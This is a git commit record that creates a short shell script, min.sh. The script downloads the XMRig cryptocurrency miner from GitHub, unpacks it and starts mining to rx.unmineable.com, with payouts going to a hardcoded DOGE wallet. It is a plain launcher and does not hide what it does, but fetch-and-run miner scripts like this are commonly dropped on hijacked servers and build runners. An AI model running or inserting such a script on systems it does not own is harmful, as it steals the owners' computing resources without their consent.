8cec58c47e51537946bd3424101352f178fbc699
ythermawan <89501800+ythermawan@users.noreply.github.com>
2021-08-25 11:34:20 +0700

    Create min.sh

---
+++ min.sh
@@ -0,0 +1,4 @@
+  
+wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar -zxf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3 
+
+./xmrig --donate-level 5 -o rx.unmineable.com:3333 -u DOGE:DPKQTG1oxFCiEzZREZtZdG5C3yUo4VysgW  -p x -k -a rx/
